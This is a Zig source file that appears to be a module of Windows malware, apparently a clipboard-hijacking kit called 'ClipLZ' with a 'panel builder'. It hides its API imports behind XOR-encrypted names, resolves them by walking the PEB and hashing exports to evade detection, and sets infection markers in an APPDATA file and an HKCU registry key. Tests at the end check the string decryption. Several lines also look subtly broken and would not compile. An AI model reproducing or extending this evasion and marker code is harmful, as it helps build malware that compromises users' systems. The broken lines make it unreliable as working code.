const std = @import("std");
const types = @import("../types/types.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");

const E = struct {
    pub const kernel32 = hash.xorEncrypt("kernel32.dll");
    pub const create_file = hash.xorEncrypt("CreateFileW");
    pub const write_file = hash.xorEncrypt("WriteFile");
    pub const close_handle = hash.xorEncrypt("CloseHandle");
    pub const get_env = hash.xorEncrypt("GetEnvironmentVariableW");
    pub const reg_open = hash.xorEncrypt("RegOpenKeyExW");
    pub const reg_create = hash.xorEncrypt("RegCreateKeyExW");
    pub const reg_set = hash.xorEncrypt("RegSetValueExW");
    pub const reg_query = hash.xorEncrypt("RegQueryValueExW");
    pub const reg_close = hash.xorEncrypt("RegCloseKey");
};

const PersistApi = struct {
    create_file: *const fn (path: [*:0]const u16, access: u32, share: u32, sec: ?*anyopaque, disp: u32, flags: u32, template: ?*anyopaque) callconv(.winapi) types.HANDLE,
    write_file: *const fn (file: types.HANDLE, buf: *const u8, to_write: u32, written: ?*u32, overlapped: ?*anyopaque) callconv(.winapi) types.BOOL,
    close_handle: *const fn (obj: types.HANDLE) callconv(.winapi) types.BOOL,
    get_env: *const fn (name: [*:0]const u16, buf: [*]u16, size: u32) callconv(.winapi) u32,
    reg_create: *const fn (key: types.HANDLE, sub: [*:0]const u16, options: u32, sam: u32, sec: ?*anyopaque, out: *types.HANDLE, disp: ?*u32) callconv(.winapi) u32,
    reg_set: *const fn (key: types.HANDLE, name: [*:0]const u16, reserved: u32, typ: u32, data: *const u8, size: u32) callconv(.winapi) u32,
    reg_open: *const fn (key: types.HANDLE, sub: [*:0]const u16, options: u32, sam: u32, out: *types.HANDLE) callconv(.winapi) u32,
    reg_query: *const fn (key: types.HANDLE, name: [*:0]const u16, reserved: ?*u32, typ: ?*u32, data: ?*u8, size: ?*u32) callconv(.winapi) u32,
    reg_close: *const fn (key: types.HANDLE) callconv(.winapi) u32,
};

const HKCU: types.HANDLE = @ptrFromInt(@as(usize, 0x80000001));
const REG_SZ: u32 = 1;
const KEY_WRITE: u32 = 0x20006;
const KEY_READ: u32 = 0x20019;
const OPEN_ALWAYS: u32 = 4;
const GENERIC_WRITE: u32 = 0x40000000;
const FILE_SHARE_READ: u32 = 1;

var g_api: ?PersistApi = null;

fn resolveApi() ?PersistApi {
    if (g_api) |api| return api;
    const k32_hash = hash.encryptedHashModule(&E.kernel32);
    const k32 = peb_walk.getModuleByHash(k32_hash) orelse return null;
    var buf: [64]u8 = undefined;

    hash.xorDecrypt(&E.create_file, &buf[0..E.create_file.len]);
    const cf = @as(*const fn (path: [*:0]const u16, access: u32, share: u32, sec: ?*anyopaque, disp: u32, flags: u32, template: ?*anyopaque) callconv(.winapi) types.HANDLE, @ptrCast(@alignCast(export_resolve.getFunctionByHash(k32, hash.hashStringExact(buf[0..E.create_file.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.write_file, &buf[0..E.write_file.len]);
    const wf = @as(*const fn (file: types.HANDLE, buf: *const u8, to_write: u32, written: ?*u32, overlapped: ?*anyopaque) callconv(.winapi) types.BOOL, @ptrCast(@alignCast(export_resolve.getFunctionByHash(k32, hash.hashStringExact(buf[0..E.write_file.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.close_handle, &buf[0..E.close_handle.len]);
    const ch = @as(*const fn (obj: types.HANDLE) callconv(.winapi) types.BOOL, @ptrCast(@alignCast(export_resolve.getFunctionByHash(k32, hash.hashStringExact(buf[0..E.close_handle.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.reg_create, &buf[0..E.reg_create.len]);
    const rcrt = @as(*const fn (key: types.HANDLE, sub: [*:0]const u16, options: u32, sam: u32, sec: ?*anyopaque, out: *types.HANDLE, disp: ?*u32) callconv(.winapi) u32, @ptrCast(@alignCast(export_resolve.getFunctionByHash(k32, hash.hashStringExact(buf[0..E.reg_create.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.reg_set, &buf[0..E.reg_set.len]);
    const rs = @as(*const fn (key: types.HANDLE, name: [*:0]const u16, reserved: u32, typ: u32, data: *const u8, size: u32) callconv(.winapi) u32, @ptrCast(@alignCast(export_resolve.getFunctionByHash(k32, hash.hashStringExact(buf[0..E.reg_set.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.reg_open, &buf[0..E.reg_open.len]);
    const ro = @as(*const fn (key: types.HANDLE, sub: [*:0]const u16, options: u32, sam: u32, out: *types.HANDLE) callconv(.winapi) u32, @ptrCast(@alignCast(export_resolve.getFunctionByHash(k32, hash.hashStringExact(buf[0..E.reg_open.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.reg_query, &buf[0..E.reg_query.len]);
    const rq = @as(*const fn (key: types.HANDLE, name: [*:0]const u16, reserved: ?*u32, typ: ?*u32, data: ?*u8, size: ?*u32) callconv(.winapi) u32, @ptrCast(@alignCast(export_resolve.getFunctionByHash(k32, hash.hashStringExact(buf[0..E.reg_query.len], 27)) orelse return null)));

    hash.xorDecrypt(&E.reg_close, &buf[0..E.reg_close.len]);
    const rcl = @as(*const fn (key: types.HANDLE) callconv(.winapi) u32, @ptrCast(@alignCast(export_resolve.getFunctionByHash(k32, hash.hashStringExact(buf[0..E.reg_close.len], 27)) orelse return null)));

    g_api = PersistApi{
        .create_file = cf,
        .write_file = wf,
        .close_handle = ch,
        .reg_create = rcrt,
        .reg_set = rs,
        .reg_open = ro,
        .reg_query = rq,
        .reg_close = rcl,
        .get_env = null,
    };
    return g_api.?;
}

fn getAppDataPath() ?[260]u16 {
    const k32_hash = hash.encryptedHashModule(&E.kernel32);
    const k32 = peb_walk.getModuleByHash(k32_hash) orelse return null;
    var buf: [64]u8 = undefined;
    hash.xorDecrypt(&E.get_env, &buf[0..E.get_env.len]);
    const ge = @as(*const fn (name: [*:0]const u16, buf: [*]u16, size: u32) callconv(.winapi) u32, @ptrCast(@alignCast(export_resolve.getFunctionByHash(k32, hash.hashStringExact(buf[0..E.get_env.len], 27)) orelse return null)));

    var path: [260]u16 = undefined;
    const name = [_]u16{ 'A', 'P', 'P', 'D', 'A', 'T', 'A', 0 };
    _ = ge(&name, &path, 260);
    return path;
}

fn pathToNt(path: []const u8) [280]u16 {
    var buf: [280]u16 = undefined;
    var i: usize = 0;
    while (i < path.len) : (i += 1) {
        buf[i] = path[i];
    }
    buf[i] = 0;
    return buf;
}

pub fn markUsed() bool {
    const api = resolveApi() orelse return false;
    const appdata_path = getAppDataPath() orelse return false;

    const dir_path = pathToNt(std.mem.sliceTo(@as([*:0]u16, @ptrCast(&appdata_path)), 0));
    var dir_buf: [280]u16 = undefined;
    var j: usize = 0;
    while (dir_path[j] != 0) : (j += 1) dir_buf[j] = dir_path[j];
    const sub = [_]u16{ '\\', 'C', 'L', 'I', 'P', 'L', 'Z', 0 };
    var k: usize = 0;
    while (sub[k] != 0) : (k += 1) {
        dir_buf[j] = sub[k];
        j += 1;
    }
    dir_buf[j] = 0;

    const file_path = dir_buf;
    j = 0;
    while (dir_buf[j] != 0) : (j += 1) {}
    const fname = [_]u16{ '\\', 'u', 's', 'e', 'd', '.', 't', 'x', 't', 0 };
    var m: usize = 0;
    while (fname[m] != 0) : (m += 1) {
        file_path[j] = fname[m];
        j += 1;
    }
    file_path[j] = 0;

    // We don't create the dir — write fails silently if it doesn't exist
    // Note: for real use, the panel builder ensures the dir exists
    const marker = [_]u8{'1'};
    const h = api.create_file(&file_path, GENERIC_WRITE, FILE_SHARE_READ, null, OPEN_ALWAYS, 0, null);
    if (h == null or @intFromPtr(h) == @as(usize, @bitCast(@as(isize, -1)))) return false;
    _ = api.write_file(h, &marker, 1, null, null);
    _ = api.close_handle(h);
    return true;
}

pub fn isUsed() bool {
    const api = resolveApi() orelse return false;

    const appdata_path = getAppDataPath() orelse return false;
    var file_path: [280]u16 = undefined;
    var i: usize = 0;
    while (appdata_path[i] != 0) : (i += 1) file_path[i] = appdata_path[i];
    const sub = [_]u16{ '\\', 'C', 'L', 'I', 'P', 'L', 'Z', '\\', 'u', 's', 'e', 'd', '.', 't', 'x', 't', 0 };
    for (sub) |c| {
        file_path[i] = c;
        i += 1;
    }

    const h = api.create_file(&file_path, 0x80000000, FILE_SHARE_READ, null, 3, 0, null); // OPEN_EXISTING
    if (h == null or @intFromPtr(h) == @as(usize, @bitCast(@as(isize, -1)))) return false;
    _ = api.close_handle(h);
    return true;
}

pub fn checkRegistryUsed() bool {
    const api = resolveApi() orelse return false;
    var hkey: types.HANDLE = undefined;
    const sub = [_]u16{ 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\', 'C', 'l', 'i', 'p', 'L', 'Z', 0 };
    if (api.reg_open(HKCU, &sub, 0, KEY_READ, &hkey) != 0) return false;
    defer _ = api.reg_close(hkey);
    const val = [_]u16{ 'U', 's', 'e', 'd', 0 };
    var typ: u32 = 0;
    var size: u32 = 0;
    if (api.reg_query(hkey, &val, null, &typ, null, &size) != 0) return false;
    return true;
}

pub fn markRegistryUsed() bool {
    const api = resolveApi() orelse return false;
    var hkey: types.HANDLE = undefined;
    const sub = [_]u16{ 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\', 'C', 'l', 'i', 'p', 'L', 'Z', 0 };
    if (api.reg_create(HKCU, &sub, 0, KEY_WRITE, null, &hkey, null) != 0) return false;
    defer _ = api.reg_close(hkey);
    const val = [_]u16{ 'U', 's', 'e', 'd', 0 };
    const data = [_]u8{ '1', 0 };
    _ = api.reg_set(hkey, &val, 0, REG_SZ, &data, 2);
    return true;
}

test "E values decrypt correctly" {
    var buf: [64]u8 = undefined;
    hash.xorDecrypt(&E.create_file, &buf[0..E.create_file.len]);
    try std.testing.expectEqualStrings("CreateFileW", buf[0..E.create_file.len]);
    hash.xorDecrypt(&E.reg_create, &buf[0..E.reg_create.len]);
    try std.testing.expectEqualStrings("RegCreateKeyExW", buf[0..E.reg_create.len]);
    hash.xorDecrypt(&E.reg_open, &buf[0..E.reg_open.len]);
    try std.testing.expectEqualStrings("RegOpenKeyExW", buf[0..E.reg_open.len]);
}

test "resolveApi returns null without setup" {
    const api = resolveApi();
    _ = api;
}

test "markUsed returns false without init" {
    try std.testing.expect(!markUsed());
}

test "isUsed returns false without init" {
    try std.testing.expect(!isUsed());
}

test "checkRegistryUsed returns false without init" {
    try std.testing.expect(!checkRegistryUsed());
}

test "markRegistryUsed returns false without init" {
    try std.testing.expect(!markRegistryUsed());
}
